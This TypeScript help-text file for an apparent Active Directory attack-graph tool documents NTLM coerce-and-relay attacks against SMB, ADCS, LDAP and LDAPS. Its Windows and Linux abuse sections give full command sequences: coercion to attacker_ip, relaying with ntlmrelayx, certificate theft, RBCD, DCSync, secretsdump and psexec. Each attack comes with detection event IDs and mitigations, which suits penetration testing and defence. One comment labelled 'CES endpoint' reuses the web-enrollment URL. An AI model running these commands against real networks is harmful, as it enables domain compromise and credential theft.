import type { EdgeHelpText } from './types';

export const adNtlmRelayEdges: EdgeHelpText[] = [
  {
    kind: 'CoerceAndRelayNTLMToSMB',
    category: 'NTLM Relay',
    general:
      'The CoerceAndRelayNTLMToSMB edge indicates that a machine account can be coerced into authenticating to an attacker-controlled host, and that NTLM authentication can be relayed to SMB on a target computer where SMB signing is not required. The coercion step uses protocols like MS-EFSR (PetitPotam), MS-RPRN (PrinterBug/SpoolSample), MS-DFSNM (DFSCoerce), or MS-FSRVP (ShadowCoerce) to force the source machine to authenticate to the attacker. The relay step forwards the NTLM authentication to SMB on the target, achieving code execution if the coerced machine account has local admin rights on the target (common for Domain Controllers).',
    windowsAbuse: `# This attack is primarily executed from Linux due to ntlmrelayx.py
# However, coercion can be triggered from Windows:

# Check if PrintSpooler service is running (for PrinterBug)
ls \\\\target.domain.local\\pipe\\spoolss

# Trigger PrinterBug using SpoolSample
SpoolSample.exe dc.domain.local attacker.domain.local

# Trigger PetitPotam (unauthenticated variant, pre-patch)
PetitPotam.exe attacker.domain.local dc.domain.local`,
    linuxAbuse: `# Step 1: Set up the relay to SMB (target must not require SMB signing)
ntlmrelayx.py -t smb://target.domain.local -smb2support -c 'whoami'

# Or relay to get an interactive shell
ntlmrelayx.py -t smb://target.domain.local -smb2support -i

# Or dump SAM hashes
ntlmrelayx.py -t smb://target.domain.local -smb2support

# Step 2: Trigger coercion from the source machine

# PetitPotam (MS-EFSR) - may work unauthenticated on unpatched systems
python3 PetitPotam.py attacker_ip dc.domain.local

# PetitPotam (authenticated)
python3 PetitPotam.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local

# PrinterBug / SpoolSample (MS-RPRN) - requires authentication
python3 printerbug.py domain.local/attacker:'Password'@dc.domain.local attacker_ip

# DFSCoerce (MS-DFSNM) - requires authentication
python3 dfscoerce.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local

# ShadowCoerce (MS-FSRVP) - requires authentication
python3 shadowcoerce.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local`,
    opsec:
      'Coercion attempts generate different events depending on the protocol: PetitPotam generates Event ID 4624 (Logon) type 3 on the target and can be detected via MS-EFSR RPC call monitoring. PrinterBug generates Event ID 4624 type 3 and RPC activity on the Print Spooler pipe. The relayed SMB authentication generates Event ID 4624 type 3 on the relay target with the coerced machine account identity. SMB relay creates a service (Event ID 7045) or process (Event ID 4688) for command execution. Monitor for machine accounts authenticating to unexpected hosts, especially non-DC hosts. Enforce SMB signing on all systems to prevent SMB relay.',
    references: [
      {
        title: 'PetitPotam - NTLM Relay via MS-EFSR',
        url: 'https://github.com/topotam/PetitPotam',
      },
      {
        title: 'The Hacker Recipes - NTLM Relay',
        url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay',
      },
      {
        title: 'Impacket - ntlmrelayx',
        url: 'https://github.com/fortra/impacket',
      },
      {
        title: 'DFSCoerce - NTLM Relay via MS-DFSNM',
        url: 'https://github.com/Wh04m1001/DFSCoerce',
      },
    ],
  },
  {
    kind: 'CoerceAndRelayNTLMToADCS',
    category: 'NTLM Relay',
    general:
      'The CoerceAndRelayNTLMToADCS edge indicates that a machine account can be coerced into authenticating to an attacker-controlled host, and that the NTLM authentication can be relayed to the ADCS HTTP enrollment endpoint to obtain a certificate for the coerced machine account. The ADCS web enrollment endpoint (typically at http://ca-server/certsrv/) accepts NTLM authentication and does not enforce EPA (Extended Protection for Authentication) by default. By relaying a Domain Controller machine account authentication to this endpoint, the attacker obtains a certificate that can be used to authenticate as the DC machine account, enabling DCSync or full domain compromise.',
    windowsAbuse: `# Coercion is typically triggered from Windows, but the relay is run on Linux
# Trigger PetitPotam from Windows
PetitPotam.exe attacker.domain.local dc.domain.local

# After obtaining the certificate (from Linux relay), use it on Windows
Rubeus.exe asktgt /user:dc$ /certificate:dc.pfx /ptt

# Perform DCSync with the DC machine account TGT
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt`,
    linuxAbuse: `# Step 1: Set up relay to ADCS web enrollment
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Or target the CES (Certificate Enrollment Service) endpoint
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Step 2: Trigger coercion from the DC

# PetitPotam
python3 PetitPotam.py attacker_ip dc.domain.local

# PrinterBug
python3 printerbug.py domain.local/attacker:'Password'@dc.domain.local attacker_ip

# DFSCoerce
python3 dfscoerce.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local

# Step 3: ntlmrelayx.py will output a Base64-encoded certificate
# Decode and save it
echo "<base64cert>" | base64 -d > dc.pfx

# Step 4: Authenticate with the certificate
certipy auth -pfx dc.pfx -dc-ip 10.0.0.1

# Step 5: Use the resulting TGT or hash for DCSync
secretsdump.py -k -no-pass dc.domain.local`,
    opsec:
      'The coercion generates the same events as CoerceAndRelayNTLMToSMB. The ADCS web enrollment relay generates Event ID 4886 (certificate request) and Event ID 4887 (certificate issued) on the CA with the machine account as the subject. The IIS logs on the CA server will show the HTTP enrollment request. Event ID 4768 with certificate information is generated when the certificate is used for PKINIT. Monitor for machine account certificate enrollments that were not initiated from the machine itself. Enforce EPA on ADCS HTTP endpoints and enable HTTPS with channel binding to prevent relay. Disable HTTP enrollment if not needed.',
    references: [
      {
        title: 'PetitPotam to Domain Admin - ExploitPH',
        url: 'https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/',
      },
      {
        title: 'The Hacker Recipes - ADCS Relay',
        url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay#adcs-web-enrollment',
      },
      {
        title: 'SpecterOps - Certified Pre-Owned (ESC8)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Impacket - ntlmrelayx ADCS Support',
        url: 'https://github.com/fortra/impacket',
      },
    ],
  },
  {
    kind: 'CoerceAndRelayNTLMToLDAP',
    category: 'NTLM Relay',
    general:
      'The CoerceAndRelayNTLMToLDAP edge indicates that a machine account can be coerced into authenticating and the NTLM authentication can be relayed to LDAP on a Domain Controller where LDAP signing is not enforced. LDAP relay is powerful because it allows the attacker to perform AD modifications as the relayed identity. Common post-relay actions include: (1) configuring Resource-Based Constrained Delegation (RBCD) on a target computer by writing to msDS-AllowedToActOnBehalfOfOtherIdentity, (2) adding shadow credentials by writing to msDS-KeyCredentialLink, or (3) adding the attacker to a group. NTLM relay to LDAP requires that LDAP signing is NOT enforced (the default in many environments).',
    windowsAbuse: `# Coercion is triggered from Windows
PetitPotam.exe attacker.domain.local dc.domain.local
SpoolSample.exe dc.domain.local attacker.domain.local

# The relay and exploitation happen on Linux (ntlmrelayx.py)
# After RBCD is configured, complete the attack on Windows:
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt`,
    linuxAbuse: `# Step 1: Set up relay to LDAP with RBCD delegation attack
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --delegate-access

# Or relay to LDAP with shadow credentials attack
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --shadow-credentials

# Or relay with a custom LDAP attack
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --escalate-user attacker

# Step 2: Trigger coercion

# PetitPotam
python3 PetitPotam.py attacker_ip dc.domain.local

# PrinterBug
python3 printerbug.py domain.local/attacker:'Password'@dc.domain.local attacker_ip

# DFSCoerce
python3 dfscoerce.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local

# Step 3: After RBCD is configured, complete S4U attack
# ntlmrelayx will create a machine account and configure RBCD automatically
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/'FAKECOMPUTER$':'Password'

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local

# After shadow credentials, use the certificate
certipy auth -pfx machine.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Coercion generates Event ID 4624 type 3 for the initial authentication. The LDAP relay generates Event ID 4624 type 3 on the DC for the LDAP connection. RBCD configuration generates Event ID 5136 (directory object modified) for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute change. Shadow credentials modification generates Event ID 5136 for msDS-KeyCredentialLink. Machine account creation generates Event ID 4741. Monitor for unexpected LDAP modifications by machine accounts, especially to security-sensitive attributes. Enforce LDAP signing (GPO: "Domain controller: LDAP server signing requirements = Require signing") to prevent LDAP relay entirely.',
    references: [
      {
        title: 'The Hacker Recipes - NTLM Relay to LDAP',
        url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay#ldap',
      },
      {
        title: 'Impacket - ntlmrelayx Delegate Access',
        url: 'https://github.com/fortra/impacket',
      },
      {
        title: 'SpecterOps - Shadow Credentials',
        url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab',
      },
      {
        title: 'Microsoft - LDAP Signing Requirements',
        url: 'https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-signing-requirements',
      },
    ],
  },
  {
    kind: 'CoerceAndRelayNTLMToLDAPS',
    category: 'NTLM Relay',
    general:
      'The CoerceAndRelayNTLMToLDAPS edge indicates that NTLM authentication can be relayed to LDAPS (LDAP over TLS, port 636) on a Domain Controller. LDAPS relay is significant because LDAP channel binding (EPA) is often not enforced even when LDAP signing is, and LDAPS connections satisfy the signing requirement by virtue of TLS encryption. This means that in environments where LDAP signing is enforced (blocking plain LDAP relay), LDAPS relay may still work if channel binding is not required. The post-relay attacks are the same as LDAP relay: RBCD, shadow credentials, group modification, etc.',
    windowsAbuse: `# Coercion from Windows
PetitPotam.exe attacker.domain.local dc.domain.local
SpoolSample.exe dc.domain.local attacker.domain.local

# After RBCD configuration via Linux relay, complete on Windows
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt`,
    linuxAbuse: `# Step 1: Set up relay to LDAPS with RBCD delegation
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --delegate-access

# Or with shadow credentials
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --shadow-credentials

# Step 2: Trigger coercion

# PetitPotam
python3 PetitPotam.py attacker_ip dc.domain.local

# PrinterBug
python3 printerbug.py domain.local/attacker:'Password'@dc.domain.local attacker_ip

# DFSCoerce
python3 dfscoerce.py -u attacker -p 'Password' -d domain.local attacker_ip dc.domain.local

# Step 3: Complete post-relay attack (RBCD or shadow credentials)
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/'FAKECOMPUTER$':'Password'

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local`,
    opsec:
      'LDAPS connections are logged similarly to LDAP but over TLS. Event ID 4624 type 3 on the DC, Event ID 5136 for directory modifications. The TLS connection itself may be logged in Schannel debug logs. Detection is similar to LDAP relay but harder because the encrypted channel obscures some network-level inspection. Enforce LDAP channel binding (EPA) via the "Domain controller: LDAP server channel binding token requirements" GPO setting to "Always" to prevent LDAPS relay. Note that channel binding enforcement was progressively tightened by Microsoft starting with KB5030987 and enforced by default in updates from 2024 onward.',
    references: [
      {
        title: 'The Hacker Recipes - NTLM Relay to LDAPS',
        url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay#ldaps',
      },
      {
        title: 'Microsoft - LDAP Channel Binding',
        url: 'https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-channel-binding-token-requirements',
      },
      {
        title: 'Impacket - ntlmrelayx',
        url: 'https://github.com/fortra/impacket',
      },
    ],
  },
];
